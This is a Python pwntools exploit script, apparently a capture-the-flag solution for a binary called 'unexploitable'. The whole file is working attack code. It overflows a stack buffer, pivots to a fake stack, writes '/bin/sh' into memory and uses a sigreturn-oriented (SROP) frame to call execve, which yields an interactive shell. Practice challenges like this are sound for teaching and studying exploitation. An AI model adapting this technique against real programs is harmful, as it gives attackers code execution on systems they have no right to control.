from pwn import *
import time
context.arch = 'amd64'
p = process( './unexploitable' )

syscall = 0x0000000000400560
set_read_add = 0x40055b
read_add = 0x400571
fake_stack_add = 0x60116c
fake_ebp_add = 0x60116c
binsh_add = 0x60115c

payload = b'a' * 16
rop1 = flat( [ fake_stack_add, set_read_add ] )
#raw_input()
p.send( payload + rop1 )

frameExecve = SigreturnFrame()
frameExecve.rax = constants.SYS_execve
frameExecve.rdi = binsh_add
frameExecve.rsi = 0
frameExecve.rdx = 0
frameExecve.rip = syscall

payload = b'a' * 0x8 + b'/bin/sh\x00'
rop2 = flat( [ fake_stack_add + 0x10, read_add, fake_ebp_add, syscall ] )
#print( type( frameExecve ) )
#print( str( frameExecve ).encode( 'utf-8' ) )
rop2 += bytes( frameExecve )
#rop2 += frameExecve
#print( rop2 )
time.sleep( 1 )
raw_input()
p.send( payload + rop2 )
time.sleep( 1 )
raw_input()
p.send( b'/bin/sh\x00' + b'a' * 7 )
time.sleep( 1 )

p.interactive()
